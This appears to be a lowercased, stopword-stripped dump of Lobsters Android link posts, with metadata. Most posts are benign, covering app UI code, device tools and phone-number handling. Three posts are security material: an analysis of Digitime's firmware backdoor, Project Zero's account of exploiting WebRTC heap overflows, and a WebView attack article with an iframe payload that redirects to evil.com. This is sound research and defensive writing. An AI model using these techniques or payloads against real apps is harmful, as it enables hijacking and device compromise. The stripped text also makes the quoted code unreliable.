phoneid field using getconfig log message call old perhaps used older version worker version worker actually add location id version looked also store uuid hidden file sd cardexternal storage ca nt pas tracking opportunity worker c c scheduling worker scheduler nt include dormant period boot scheduler get going straight away otherwise work similar fashion default configuration requires minimum hour checkins regardless connection type theoretically changeable perclient basis c c server config update mechanism nt know actually condition met actioncheck called worker extend functionality later worker c c checkin client sends check request worker url enclosing envinfo data includes phone model serial number channelproject id uid boot module whether host package app installdelete permission package name signature whether host package system app bit internal metadata worker also add imei imsi envinfo data tag extra payload main request data returned getinstallreport later result checked command typical fashion worker support register upgrade test worker also support info install uninstall retention server also optionally supply update config seen handler optionally params object contains value cid pid activatetime register upgrade command basically seen test command nothing b worker little check supply envinfo data every often upgrade otherwise nothing interest let look fancier worker worker c c info gathering info command present worker thing really start seem like malware asks client send back request bunch information base request includes return envinfo however server supply infolevel integer individual bit specify kind information return bit configgetinfo called returning worker entire configuration bit phoneinfo called returning metadata phone androidosbuild class bit phonereadtelephonyinfo called returning identifying info user mobile network sim card bit packagereadlist false called returning name flag installed nonsystem package bit packagereadlist true called returning name flag installed package worker c c package control next install uninstall command present worker giving digitime ability remotely install apps report sent check come handy server install command accompanied detail apk download install along metadata information install process get stored install report using updateinstallreport function new lua thread started workerinstall function additionally server pass true keepcheck field worker call store information id type package service action mode either install report update accompanied call actionreport call c c server tell current status workerinstall function separate thread simply read parameter passed last install action downloads apk fetched installs package call schedulenext activate turn call workeractivate new thread second workeractivate check make sure package installed attempt activate using specified intent optionally include channel id project id device id activatetime configuration field passing newly installed app else uninstall command fairly predictable allowing digitime server remove specified app mentioned retention command earlier server supply list apps worker act upon depending mode value specified app remove list add list regular checking uninstall entirely call misccheckappretention function check see whether app installed running optionally forcibly reactivate worker c c backdoor difference worker come worker installs package shelling pm command worker ups ante using wide variety method install remove package check version code lua host determine method offer call one variety method prefers shelling pm prefers isinstallpackage isdeletepackage prefers isipackage isdpackage prefers isipa isdpa prefers isgri isgrd make difficult fully document nt managed find example host apps provide version sure behind scene systemfota app preloaded cosmo communicator however provides isgri isgrd method among others hook favourite part whole disaster foslenhance cosmo systemfota app includes set obscurely named interface called iorgx iorgy iorgz defined within package yes really say internel accessed comdtinfotoolsactivityl class bit comdtinfotoolscall package method bound lua method box class fostate including isgri isgrd method mentioned call custom android system service present cosmo yet located device rom include code fota updater interacts except update check ui call lb fetch backdoor version number iorgz interface orgzver method fails check call fails making heavy assumption suspect digitime asks oems include service firmware requirement fota updater simply ensures nt remove part fota update system actually us service far tell way would used digitime load worker onto device us remotely install apps service question accessed calling servicemanagergetservice foslenhance return instance androidappilightsservice ipc service defined bootframework nt exist stock android implementation question defined class defined service framework looking give u welldefined public interface service connection android service fully ipc enabled via binder addservice register service given name ibinder integer version number getservice return service ibinder getserviceversion return service version listservice return list registered service name removeservice remove service name interesting thing handler android secret code typing phone app trigger receiver show notification also unused access control method c string validates passed string calling package one installrunharryliudigicomligthservicetest comfotawirelessupdate comsystemftools also getversion method return version examined subservices static method called initialisation turn call orgximpregservice orgyimpregservice orgzimpregservcie yes misspelled register three used service also add fpservice instance empty name mean never actually get added fpservice defined bootframework implement iorgb interface two method one read file one writes file however even used backdoor iorgx service offer method play around package orgxgrd uninstalls package orgxgri installs package orgxgrr call android recovery system install ota package orgxgsas call packagemanagersetapplicationenabledsetting set app enabled status system privilege orgxgscs call packagemanagersetcomponentenabledsetting set component enabled status system privilege backdoor iorgy service offer one hilariously powerful method orgygm allows android permission silently granted app regardless whether defines permission manifest delving state packagemanagerservice using copious amount java reflection backdoor iorgz one bucket unrelated fun thing lot helpful debug message usual digitime fashion orgzg return device last known location orgztan get package name current topforeground activity orgzab addcheckappaction add action getactions arraylist orgzrb remove action getactions arraylist orgzr reboots device orgzcfd copy callerprovided file handle callerprovided path system privilege orgzrfd copy callerprovided path callerprovided file handle system privilege orgzdfd deletes file callerprovided path orgzver return version string using constant defined orgzinbase obtains bunch information device metadata serial number imeis sim detail network detail regionlanguage etc pack json crudely xorencrypts result orgzdaemonaddse add component q map orgzreser remove component q map orgzclser clear protect service remove every component q map orgzlife iterate every service listed q map running send arbitrary broadcast orgzrout remove serviceforegroundtimeoutmsg sure one security implication okay first consider done system privilege app access service authentication place every method extra parameter must set constant string uisteopck depending subservice presence unused c string method mentioned earlier implies digitime one point toying requiring calling app particular id well passing appropriate string nt even bother end ability grant app arbitrary permission readwrite file system user mean app running system digitime foslenhance service ridiculous amount power able use dump android account database including auth token even disable systemfota system app unprivileged app declared permission could nt use read app data android sandbox specific linux user may way someone android security knowledge could pull really like see device contain backdoor could nt track rom planet gemini mentioned earlier also us digitime fota updater significantly older version require include backdoor malware linked digitime research came across bunch example known adwaremalware distributed cdn digitime us distribute worker various apks almost identical randomly generated name package name certificate comsenelevenholesuit comhinedeyempoy furthermore contain reporting mechanism talk server belonging digitime speak almostidentical protocol semireadable nonsense encryption key example comsenelevenholesuit render ad loaded sxomuchaincom domain registered person using whois info shopping mall tokyo qiming iot website phone home http hooconsant class example includes traditional channel id project id used digitime system encryption key hoopacket class also used legitimate side fota updater comspitsbergentemperatures available koodous another app nothing render ad actually includes code fetch cid pid activatetime value worker pas app intent obvious intended installed digitime worker system thread xda developer includes packet dump someone actively affected digitime worker installing malware phone running fota app dump encrypted trivial decrypt know key appear running backdoorfree worker decrypted install command server sent errcode cmd install params id replacemethod service comemblazonfelicitutiljuesvc package comemblazonfelicit keepcheck true cmd install url http action type intentservice intentaction comemblazonfelicitutiljuesvc extra true packagever type config intervalshort intervallong variety fun example find search online url able track mention andor copy file located digitime cdn comslnormal comspitsbergentemperatures comreibiahsbghsrunst comioqicscigaxpljb comuctsadtxaschquyry commonecaswedwakesmen comhinedeyempoy comsenelevenholesuit comgratedpower compeonymochi next contacted planet computer december digitime software included cosmo replied next day saying passed onto developer ca nt comment understandably hoping remove nevertheless planet one oem though undoubtedly others using digitime service way trust ota distributor moonlight malware distributor like nt typical accidental security bug company knowingly actively putting malware distribution mechanism phone supply chain getting paid truly living dream nt even first time ota update provider caught redhanded abusing trust security firm kryptowire discovered similar situation involving adups whose fota software exfiltrated personal data allowed arbitrary apps installed hey nt seem familiar perhaps publicly shaming digitime make something change one guy laptop big research firm better nothing right device digitime backdoor present interested knowing take look firmware let know twitter ninji email ninji wuffsorg update ready write full followup yet wanted amend note contact planet computer past day regarding situation pc entirely unaware security issue ota software working mitigation switching away digitime happy response handling professional receptive started investigating issue internally day notified digitime appear realised game spotted noticed interesting change yesterday poked api first time using cosmo id served brand new worker version entirely rip functionality bar external function leaf essentially empty shell file dated curiously day pc made internal inquiry following disclosure also tried pretending gretel packet dump xda developer thread linked earlier got brand new worker identified workerversionext yeah identical standard b worker respect except version id compile date server handling boot request simply returning many connection error today change occurred boot server working url simply return pretending cosmo gemini get request upgrade worker http old b worker different url pretending gretel using exact request sent yesterday get http sound like would variant cosmo empty worker url also digitimetech qimingiot website taken today record removed replaced cnames random residential ip address shoutout securitytrails helping confirm http securitytrailscomdomainwwwdigitimetechcomhistorya management portal portaldigitimetechcom device manufacturer still running bit digitime web presence still seems running previous post shade grey building emulator
25,Lobsters,android,Android,HTTPS Obsolescence,https://www.camg.me/https-obsolescence/,http obsolescence,nope right repair device life cycle,tablet ten year old used read lot great book although usually install application went day despite connected internet met message wondering issue connection tried open duckduckgocom chrome ah certificate issue must unable connect google play store see update install new certificate nope shame perfectly good piece hardware partially unusable hardware perspective tablet work great suit need however manufacturer product align reality right repair movement think applies ability root update tablet would restore nearly original value functionality root available tablet old trying create one would probably consume much time would economically efficient new one course go benefit manufacturer device life cycle would great see incentive around life cycle device know everything phone refrigerator built last consumer would love pay little device like continue repairable updateable visiting httponly website
26,Lobsters,android,Android,In search of the perfect pocket device,https://isene.org/2020/08/Nerding.html,search perfect pocket device,hp calculator collector vim lot nice program ericsson psion series zero terminal samsung ultra small foldable bluetooth keyboard hyperlist ruby amar tool package latex ssh weechat termux xsdl userland urxvt zsh gimp libreoffice http,lockdown geekery searching perfect pocket computer setup hp calculator collector since couple decade passion pocket computing power really long battery life amazing calculator month battery life still calculator also want real computing power ability run vim editing text decent keyboard much goody cram started quest perfect pocket computer reviving old early pocket computer running do vim running do device run lot nice program yes slow cool search better keyboard got ericsson psion series pocket computer running hoping make boot linux possible turn cf card reader device flaky kept searching forum later stumbled upon interesting project zero terminal talking raspberry pi zero packed sort port expansion capability waiting patient wait minute always carry samsung ultra anyway serve need true battery life suck cell phone always charged problem small foldable bluetooth keyboard massive computing power time added benefit easily use monitor tv screen via builtin smart view real kicker run vim galore even hyperlist plugin run ruby whole amar tool package latex ssh weechat name lot terminalconsole program readily available via termux x server app xsdl userland app fact install full linux distro fire android phone full glory terminal graphical software run session urxvt terminal running zsh gimp libreoffice whatnot nerdvana via looking zero terminal found answer right pocket quite detour ending bliss link post http
27,Lobsters,android,Android,Clean Surveys in Android,https://chelseatroy.com/2020/07/27/clean-surveys-in-android/,clean survey android,nurse amie last post symptom modifier frequency severity interference reusing view android view binding dupe liked piece might also like threepart series teaching programming course behind scene levelingup series like,reading time minutesthis summer adding feature nurse amie android app proposed developed tested dr kathryn schmitz penn state cancer institute last post app talked role empathy mobile apps care management discussed user interface design decision went weekly survey form mattered post talk technical execution form help understand decision form need see question severity decreased appetite worst much decreased appetite interfere usual daily activity often nausea severity nausea worst often vomiting severity vomiting worst severity constipation worst often loose watery stool diarrheadiarrhoea often pain abdomen belly area severity pain abdomen belly area worst much pain abdomen belly area interfere usual daily activity severity shortness breath worst much shortness breath interfere usual daily activity severity cough worst much cough interfere usual daily activity severity numbness tingling hand foot worst much numbness tingling hand foot interfere usual daily activity often pain severity pain worst much pain interfere usual daily activity severity fatigue tiredness lack energy worst much fatigue tiredness lack energy interfere usual daily activity severity pain burning urination worst often hot flashesflushes severity hot flashesflushes worst question set radio button response like many question similar exactly show placed seam choose whether agree choice among question notice one take two category symptom question asks one thirteen symptom decreased appetite nausea vomiting constipation diarrhea abdominal pain shortness breath cough numbnesstingling general pain fatigue urination pain hot flashesflushes modifier question asks one three modifier frequency severity interference daily life symptom question three modifier question one two want view divide survey section symptom real potential duplication code though lie radio button question fall three modifier category modifier category radio button label frequency never rarely occasionally frequently almost constantly severity none mild moderate severe severe interference little bit somewhat quite bit much reusing view android android allows u extract layout xml file include layout file like case layout fragmentweeklysurveyxml includes custom view life xml file called severityquestionxml weird rule custom layout work first assign id custom view see line get registered also assign layoutwidth layoutheight see line also want able assign id custom layout contain single child child layout type like android developer world cringe fragmentweeklysurveyxml already base layout meaning custom view nest layout inside layout deeper go longer take android render screen luckily one layer usually produce noticeable difference moreover case weekly survey fragment base layout already linearlayout stack view top without overlapping additional linearlayout custom view provide new information view arranged android way around called merge tag could put custom view inside merge tag tell android drop view inside wholesale parent layout without requiring layout tried app turn merge tag play nice assigning id custom view need able tell radio group answering question fragment view binding onresume method fragment see view binding yikes long repetitive theoretically could fancy metaprogramming string evaluation view id collect question response think length alone sufficient justification something clever instead leaving clear happening also worth noting line would unnecessary view binding long variable name view id even turn camelcase version equivalent snakecaseviewids unfortunately view binding play nice include syntax process trying code base learned generated view binding class look like producing efficient pattern generating boilerplate devs writing manually minimally helpful would edge helpful worked seamlessly happening believe generated class need explicitly casting view assignment findviewbyid viewtype rather straight findviewbyid point rather spend three minute cranking boilerplate know going work patch generated code view binding add null safety findviewbyid lack theoretically big selling point guess found special sauce nonnull annotation still edging functioning boilerplate much moving line tie response view name use refer question response answer line form submission map keyvalue pair new keyvalue pair key original pair pointing string label radio button filled question null instead introducing logic handle null set default value unknown unanswered question happens also insist question answered letting someone submit form even app would crash null pointer exception method extract response string custom response view set form valid invalid based whether question answer code also reveals purpose surveyresponses hash initialize onresume line manipulate background color view hash value help person easily see response still need filled try submit without completing whole form dupe extricate custom view collection section header question duplicate wording question therefore propagates code okay experience drying text code matter subtle difference fun thought experiment fare well costbenefit analysis programmer tend assume xml render hot flashesflushes question see life fragmentweeklysurveyxml file look like could theoretically use data binding consolidate common view pattern little struggled could find solution example make textviews included questionview pas text attribute love better way label handle response adding removing question requires change fewer place personal aesthetic preference though evidence far need view next post application talk persist weekly survey data local database liked piece might also like threepart series teaching programming course behind scene series levelingup series advancing skill soon audiobook read truly preorder like like loading
28,Lobsters,android,Android,Exploiting Android Messengers with WebRTC: Part 1,https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html,exploiting android messenger webrtc part,,posted natalie silvanovich project zero threepart series exploiting messenger application using vulnerability webrtc series highlight go wrong application nt apply webrtc patch communication notification security issue break part scheduled august part scheduled august part first attempt webrtc open source video conferencing solution used variety software including browser messaging client streaming service project zero reported several vulnerability webrtc past clear whether bug exploitable especially outside browser investigated whether two recent bug exploitable popular android messaging application bug vulnerability webrtc remote transport protocol rtp processing rtp protocol webrtc us transport audio video content peer peer rtp support extension extra piece data included packet tell destination peer display process data example extension contains information screen orientation sending device one contains volume level vulnerability occurred extension implemented webrtc occurred frame marking extension contains information video content split frame bug process layer information webrtc support five layer layer number threebit field extension mean go high seven lead outofbounds write following code temporalidx set layer number extension layerinfoit second temporalidx aheadof layerinfoit second temporalidx frame idpictureid newer frame subsequent layer info need update break layerinfoit second temporalidx frame idpictureid final line code outofbounds write occurs array contains five element bug also limitation obvious code start check write check whether current value memory casted unsigned integer current sequence number write occurs true practically much limitation crash usually occurred two three time tested serious limitation layerinfoit second field integer type frame idpictureid integer mean bug allows attacker write three integer outside fixed size heap buffer value written limited small represent pointer bug video timing extension processed forward error correction fec fec copy incoming rtp packet clear certain extension attempting correct error vulnerability occurs extension video timing type verified expected length cleared code causing bug follows case rtpextensiontype krtpextensionvideotiming nullify last entry packetization delay network timestamps byte p writeat extensionoffset videosendtiming kpacerexitdeltaoffset memset p break value videosendtiming kpacerexitdeltaoffset code writes six zero offset offset start extension packet however check extension data byte long even packet number byte left result bug attacker write six zero heap offset seven byte variable sized heap buffer bug better way worse others better heap buffer overflowed variable size give lot option overwritten bug heap offset also offer flexibility zero written write aligned whereas requires alignment bug worse value written zero size area written smaller six byte versus moving instruction pointer started seeing possible use either bug move instruction pointer modern android us jemalloc slab allocator use inline heap header corrupting heap metadata option instead compiled webrtc android symbol loaded ida went available object type see anything could obviously used move instruction pointer improve capability bug find anything thought maybe could use overwrite length cause larger overflow problem start bug writes integer meanwhile lot length field integer mean write also overwrites something else write nonzero value length aligned location bug processing also problematic overwrite near end incoming packet processed meaning many object accessed point overwritten memory would never used also overwrites heap buffer fixed size limit object type affected bug think would viable purpose either write zero make length smaller sure go point triggered dozen time android see crash address wider hoping might give idea way bug could influence behavior code overwriting pointer invalid value surprise crashed instruction pointer set value clearly read heap one time analyzing crash turned stunmessage object allocated overflowed region member stunmessage class follows protected std vector std uniqueptr stunattribute attrs private type length std string transactionid reducedtransactionid stunmagiccookie vtable first member vector vector laid memory turn first two member follows pointer begin pointer end pointer point beginning end vector content memory crash end member overwritten small integer vector iteration work starting begin pointer incrementing end pointer reached change mean next time vector iterated usually destructor go bound since vector contains virtual object type stunattribute perform virtual call element call destructor virtual call outofbounds memory moving instruction pointer seemed like reasonable way control instruction pointer except one problem typical configuration possible attacker one end webrtc connection send stun user instead communicate stun server asked philipp hancke webrtchacks knew way suggested method involves specifying tcp server controlled attacker potential routable path two peer called ice candidate attacker target device communicate server including stun message allowed send stun message unusually large number attribute necessary order control instruction pointer would need able control showed memory stun attribute vector jemalloc allocates similar sized allocation determined predefined size class contiguous memory run le used size class likely two object size class allocated one typically stun message small number attribute translates vector buffer size byte frequently used size class instead sent stun message attribute translated vector buffer size byte happens infrequently used size class webrtc sending many stun message number attribute time sending rtp packet size containing desired pointer value interspersed packet containing bug able get virtual call pointer value one five time good enough use exploit decided move breaking aslr breaking aslr two possible approach breaking aslr exploit one use one bug read memory send back attacker device tcp server somehow use sort crash oracle determine memory layout started seeing whether possible use one bug read memory remotely target device mark brand suggested might possible use accomplish setting low byte pointer outgoing data zero causing outofbounds data sent instead actual data seemed like promising approach used ida look potential object turned quite problem spent time sendpacketmessagedata datareceivedmessagedata object used store pointer outgoing rtp data queued contain copyonwritebuffer object first member refcounted pointer rtc buffer object possible set bottom byte pointer zero using unfortunately structure rtc buffer made revealing memory way challenging refcountedobject vtable sizet size sizet capacity std uniqueptr data hoping would possible make clipped pointer structure point object heap pointer location data pointer data would get sent instead however turned process sending data four member object get accessed need reasonably valid went available object size class rtc buffer class find one exact property considered instead using different object could use rtc buffer object already freed specific backing buffer size could replaced object containing pointer using heap manipulation work either largely issue reliability start rtc buffer object byte translates size class jemalloc meaning byte get allocated imagining contiguous allocation type address would follows buffer buffer buffer buffer buffer buffer buffer first byte buffer set zero vulnerability land valid buffer buffer set zero divide evenly end result every time bug hit sendpacketmessagedata object one three chance end pointing valid rtc buffer hitting object first place also unreliable many allocation similar size made webrtc possible increase number object heap amount time sent using tcp server make connection slow even could hit structure le time manipulate heap many freed rtc buffer object row first place backing replaced something containing pointer added even unreliability eventually abandoned approach think could get reliable enough use exploit reasonable amount effort though think probably possible crash behavior application attacked also matter lot would probably work application respawns immediately case crash would lot le practical application stop respawning unless certain delay common android also looked lot outgoing packet generated webrtc especially remote transport control protocol rtcp peer always sends even receiving audio video however outgoing packet generated stack possible alter using heap corruption bug also considered using crash oracle break aslr felt unlikely succeed specific bug start hitting heap allocation unreliable would difficult tell whether crash occurred due specific condition bug failed also unsure whether would even possible create detectable condition considering limited capability bug also thought using alter vtable function pointer order read memory cause behavior detectable crash oracle perform offsetbased exploitation require aslr broken decided pursue path end result would depend function vtables loaded location ending zero varies greatly build exploit written using method would require large amount modification work even slightly different version webrtc guarantee would work decided point needed look new bug could break aslr neither one found recently could easily stay tuned part better bug scheduled wednesday august
29,Lobsters,android,Android,Android System information command line tool,https://github.com/sbz/android-sysinfo,android system information command line tool,androidsysinfo overview system property c api bionic requirement build adb run output device htc magic htc magic nexus nexus nexus nexus huawei huawei pro,androidsysinfo overview androidsysinfo android native program report system property android device using system property c api existing android libc bionic simlar setting system phone system information displayed mobile device report model build version kernel info etc requirement need install android sdk android ndk use adb ndkbuild used build process build build makefile using adb determine android version abi ndk use order produce binary connect android device via usb enable usb debugging run make push run make run output device personal android device output information look like htc magic htc magic model name htc magic android codename sapphire android version android sdk version kernel version linux androidbuild preempt thu jul pdt baseband version build number nexus nexus model name nexus android codename crespo android version android sdk version kernel version linux androidbuild preempt mon sep pdt baseband version build number nexus nexus model name nexus android codename shamu android version android sdk version kernel version linux androidbuild smp preempt wed aug utc baseband version build number huawei huawei pro model name android codename clt android version android sdk version kernel version linux test smp preempt thu dec cst baseband version build number
30,Lobsters,android,Android,WebView - Android's most convenient footgun,https://byte.how/posts/webview-androids-most-convenient-footgun/,webview android convenient footgun,webview scratch paper differential context vulnerability dcv vulnerability difference context design flaw compact design insecure setting attack sandbox navigation attack privileged navigation attack current overlay attack android viewgroup rendering closure attack part overwritten origin hiding sameorigin policy sop required frame hijacking message forgery api native bridge hijacking inject javascript interface alternative chrome custom tab chrome custom tab trusted web activity trusted web activity twa covered conclusion dcv paper tweet,imagine web developer got little bit android experience built progressive web beautiful functional responsive everything user see meticulously placed crafted purpose proud done take webcentric experience apply android veneer like devs probably find reaching webview present web page app interface along basket feature incredibly convenient let say site interface constantly updated would want deploy new build change course pull shit dynamically webview way user get benefit native platform update speed live websitewebviews offer complete customization ui get level control alternative would either use builtin component android provides combine create scratch basically webviews need redeploy every changequick testing common tool web developer already used tonative app utilize web app functionality may proper api yet customizability lower effortas might expect come free implemented incorrectly could extensive security implication webview usher convenience also significantly increase attack surface security researcher wasted time exploring attack vector believed mitigated browser still viable within webviewsin article explore paper guangliang yang jeff huang guofei gu presented usenix investigate previously wellunderstood topic iframe security within context webview paper focus naming differential context vulnerability dcv web page running within webview opposed running browser introduce vulnerability given difference context may run discovered although vulnerability safeguard introduced traditional browser mitigation either ineffective impossible apply within context webviewswe take look attack proposedesign flawswebviews interesting target two primary reason compact design wealth setting ripe misconfigurationcompact designall attack take advantage fact unlike traditional browser webviews provide enough context end user whenever navigation occurs browser address navigation status bar addition tab control easy user tell page navigating away case webviews simply render topmost page within rendering queueinsecure settingsthe author claim webviews insecure rather focus insecure combination setting app developer may utilize settingmethodimpactwebsettingssetjavascriptenabled true allows page execute javascriptwebsettingssetjavascriptcanopenwindowsautomatically true javascript call windowopen websettingssetsupportmultiplewindows true popups rendered new webviewsviewgroupaddview add new view top viewgroupwebchromeclientoncreatewindow allows custom implementation popup creation handledwebchromeclientonclosewindow handler javascript call windowclose window close eventsnot setting need set order deem application vulnerable setting potentially dangerous even combined others explore attack make use vulnerability brought misconfigurationattacksfor following example assume page structure loaded webview parent page loaded webview via webviewload family methodsthis parent page embeds iframe trusted source http trustedcomhttps trustedcom embeds iframe untrusted source http adscomhttps adscom may un intentionally serve malicious iframe depending ad contentnotefor max attack success assume malicious ad retrieve frame content remote url instead us data url laterinfosince interested looking failure scenario assume sandbox applied iframe navigation attacktraditional navigation attackthis simple attack capitalizes webview lack navigation element click link redirects top frame malicious page untrusted iframe could embed link navigates parent frame malicious page navigates top frame malicious siteonce clicked webview redirected clear indication user none wiserprivileged navigation attackin addition navigation attack applies browser android vulnerable variant bypass sandbox top navigation restriction iframe allowed create popups sandbox sandbox set allowpopups frame open popup android always try select webview render popup supportmultiplewindows set false window created popup therefore android selects current webview essentially navigating parent frame anywayprivileged navigation attack specific androidwarningif javascriptenabled javascriptcanopenwindowsautomatically true frame also create popup windowopen showmodaldialog overlay attackhijacking ui overlay attacklike privileged navigation attack overlay attack take advantage android viewgroup rendering mechanic webview misconfiguration webview susceptible supportmultiplewindows set trueandorby default whenever popup created supportmultiplewindows true android create new webview add parent viewgroup current webview become last child parent android render view within viewgroup start drawing first child iterates viewgroup child rendering view top last popup webview last child viewgroup topmost rendered view thing user see gain full control ui misbehaving iframe need create popup closure attackhijacking ui closure attackwhat app us viewgroupaddview view part oncreatewindow handler fact mitigation overlay attack app could still danger webchromeclientonclosewindow overwritten javascriptenabled true app susceptible closure attack work like frame creates popup android creates appends new webview containing popup viewgrouppopup call windowclose original parent frame onclosewindow naive check whether parent webview closed close anywayparent webview removed viewgroup popup webview remainsthe user see popup ui hijackedorigin hidingso far previous attack require user interact malicious element sameorigin policy sop even javascript enabled none malicious frame able automatically navigate top frame would require frame share originorigins equivalent whenever protocol host port match two null origin also origin null according html specification browser required treat data url origin opaque value handy instance medium need loaded without violating sop summary parent frame null origin child frame null origin part origin longer violation sopfor general browsing rare find legitimate use case parent page need loaded via data url however android application acceptable initialize webview inline html snippet instead retrieving remote urlconsider string html html body widget iframe src http trustedcom iframe body html string encodedhtml unencodedhtmlgetbytes webviewloaddata encodedhtml texthtml webview initialized html snippet describing simple widget pull iframe trusted site webview initialized inline data parent frame origin null therefore child frame sourced data url trustedcom child produce origin parent frame null origin child frame essentially granted full controlinfofor next example assume javascriptenabled true parent webviewframe hijackingif iframe full control parent simplest thing power navigate parent frame malicious page since webview make apparent navigation occurs phishing page become much convincinglet assume trustedcom embeds iframe src http adscom unbeknownst trustedcom adscom hosting malicious ad malicious ad want navigate parent evilcom malicious ad running inside adscom frame origin http adscom according sop navigate parent however create another child frame data url child frame share origin parent frame whatever like first let look source malicious child html body script topwindowlocation http evilcom script body html converted data data texthtml malicious ad embeds iframe html body serve ad iframe src data texthtml iframe body html soon ad load parent frame navigated evilcom automatically look like slightly slowed example malicious ad hijack parent frame load facebook phisher android app automatically redirected frame hijackingmessage forgeryforging message framesconsider case parent frame need communicate trusted child frame via postmessage api parent issue message like windowframes postmessage hello parent http trustedcom trustedcom frame listens message know parent frame null origin check whenever receives message act message come expected windowonmessage function event eventorigin null privileged action scheme adscom may postmessage trustedcom message sent unacceptable http adscom origin however described earlier malicious ad embed child frame null origin similar frame hijacking child frame effectively becomes parent frame parent communicate trustedcom child could bad news trusted frame implement sensitive functionalitynative bridge hijackingaccessing privileged operation native bridgethe primary purpose webview present native android interface served web compared native application web page limited interact client device missing native functionality could jarring end user may aware viewing web page order bridge semantic gap webview allows application developer inject javascript interface granting access native java object within web app used carelessly functionality could allow privileged access untrusted codein example diagram let assume app expose apis web application createnotification creates native notification applicationgethistory get complete browsing historygetcredential get credential device credential storenotei know app might surface functionality web page go method origin checking clearly insufficient parent frame creates notification native bridge allows expects null origin next better ad personalization adscom frame try get complete browser history bridge reject citing unacceptable origin unfortunately malicious child share null origin native bridge allows retrieve credential alternativesthere doubting webview utility facilitates rapid development encourages crossplatform consistency could used powerful stopgap seen implemented incorrectly could greatly increase application vulnerable surface area google realizes provides secure alternativeschrome custom tabsif simply want render view web view may redirect user outside domain opt chrome custom tab robust solution address design flaw explored feature highlight toolbar user know navigation occurs application even register navigation callback external navigation occursshared session cookie jar user default browserprewarming background page user likely visittrusted web activitiesif full screen web content must need mix native web component trusted web activity twa recommended approach verify page loaded fact application expects loaded page fails verification app fall back showing chrome custom tab making clear external navigation occurred application requires multiple origin twa coveredconclusionif need serve content web application considering using trusted alternative absolutely must use webview wary configure setting make sure untrusted content sandboxedthis article summarizes finding excellent dcv paper presented usenix discussed automated vulnerability scanning tool built used survey popular apps google play store found potentially vulnerable including facebook instagram skype kayak leading application highly recommend read course got feedback tweet away
31,Lobsters,android,Android,Complete Android Fragment & Activity Lifecycle,https://github.com/xxv/android-lifecycle,complete android fragment activity lifecycle,complete android fragment activity lifecycle steve staticfreeinfo pdf svg note dia inkscape license creative common bysa license,complete android fragment activity lifecycle struggling trying figure various piece fit together done research put together complete android activityfragment lifecycle chart two parallel lifecycles activity fragment organized vertically time lifecycle stage occur vertical order displayed across activity fragment way see fragment interact activity see discrepancy error diagram please submit pull request contact steve staticfreeinfo vector version suitable printing pdf svg note intentionally leaf usertriggered callback onoptionsitemselected focusing lifecycle stage triggered system order keep diagram focused part hard follow canonical format diagram dia file exported svg handtweaked fix font size imported inkscape svg pdf png render hope find better workflow going forward patch always welcome license diagram various form render licensed creative common bysa license would like different creative common license please contact figure something
32,Lobsters,android,Android,Dealing with phone numbers in contact book,https://ashishb.net/tech/dealing-with-phone-numbers-in-contact-book/,dealing phone number contact book,telephone country code prefixfree telephone number multiple representation std call multiple country share telephone code continuous area code country code always adjacent confirming phone number ownership like post navigation,building app us user contact book certain gotchas avoid telephone country code prefixfree country country code country get country code like scheme ensures number inherently unambiguous telephone number multiple representation since people dial internationally telecom system implicitly assume domestic call someone dialing u dialing person india dialing since international dialing would infrequent telecom require unique prefix number like distinguish whether someone country austria state even domestic area code explicitly required user might stored phone number telecom implicitly prefix user area code user want dial beyond area telecom operator would require additional prefix mark std call localization massive implication regarding processing cleaning normalizing phone number retrieved user contact book country code area code contain usually superfluous telecom might ok calling sending sm treat number like incorrect multiple country share telephone code usa canada many country caribbean share telephony code carrier would treat call sm international though italy vatican city share continuous area code country code always adjacent population grows certain area others code reserved region get allotted example san francisco bay area first allocated top existing area code deal growing population confirming phone number ownership never trust incoming call incoming sm phone number therefore way verify user owns phone number sending text message making phone call like like loading post navigation
33,Lobsters,android,Android,I replaced Google Analytics with a web server running on my phone,https://lbrito1.github.io/blog/2020/07/replacing_google_analytics_android.html,replaced google analytics web server running phone,tldr androidanalytics termux post table content motivation even keep anything vanity metric data lack competition matomo posted hacker news developing androidanalytics already tinkered blog post fundamental first iteration sinatra webapp sinatra second iteration nginx log parser goaccess wrote parser geocoder third iteration adding viewer grafana issue blazer fourth iteration adding installation script step setup script final architecture duckdns available github conclusion previous section navigate man moon back thousand time,tldr built androidanalytics web analytics tracker running phone say run blog personal website smalltime business page something sort say also want keep eye many visitor getting first thing people think point google analytics mostly work free also hosted google make easy start using many competitor bring point table google analytics usually win wo point used use google analytics track blog reason finding termux writing post installing web server android phone started toying idea armbased ram linuxlike device internet connectivity must enough simple webcounterlike application week tinkering table content motivation even keep anything going whole thing reasonable question answered even need collect data answer simple really enjoy seeing call vanity metric think plain cool know someone half across planet read something wrote month ago maybe crawler take either way surprise google analytics always felt immensely overkill heartwarming know nerd bhutan read one post wee hour morning pretty much interested could care le acquisition treemaps audience cohort analysis behavior flow making real product available google analytics idea mean yet sure need visitor counter wanted closer late visitor count gif minus embarrassment publicity unsightly intersitial online advertising network conglomerate seo dashboard feeling google analytics google analytics dashboard short wanted geek advertisement arbitrage data aforementioned google analytics great free hosted google keep data idea data even exactly tracker sending server judging number article showing keep payload cap must lot apparently often need per request feed lovecraftian audience cohort analysis line product fair enough pretty sure purpose severalkb payload effectively using sledgehammer kill fly using google analytics willfully sending google whoknowswhat kind data designed build people advertising profile page view blog probably help google much aspect sure principle whole thing still bothered enough something lack competition lot software similar google analytics prominent probably matomo often posted hacker news free open source selfhosted cloud offering monthly fee would happily use matomo come conundrum selfhosting implies kind publicly accessible linux host would likely entirely free cloudhosting come subscription fee point trivial running lucrative business need analytics paying service sound ludicrous want simple visitor stats personal blog developing androidanalytics requirement tracker run old android phone lying around work github pageshosted site perpage view count nice geo info requirement deceivingly simple quickly learned termux make really easy run many kind software android phone already tinkered web server termux something simple page view pretty straightforward also already registered dynamic dns subdomain pointing phone ready accept incoming traffic internet first major roadblock faced getting androidhosted web server communicate github page couple day research finally learned basically impossible make request http website github page http address dynamic dns subdomain summarize make work cost client browser something like actively mark allow mixed content checkbox somewhere browser flagsadvanced option lead excruciating path obtaining using verified ssl certificate android phone dynamic dns subdomain took long enough want write separate blog post tldr entirely possible get verified ssl cert dynamic dns subdomain entirely free depending isp different choice ssl challenge able receive tcp request port possible get certificate free figured ssl thing rest pretty much breeze fundamental tried different idea developing overall architecture always javascript code tracked page call android host android host save information database graphical tool used parse data something viewable chart etc first iteration sinatra webapp started sinatra webapp single post endpoint would receive request tracked page immediately save postgres database used nginx reverseproxy handled traffic passing sinatra approach merit simple understand reliable also worked watching work day realized whole webapp part 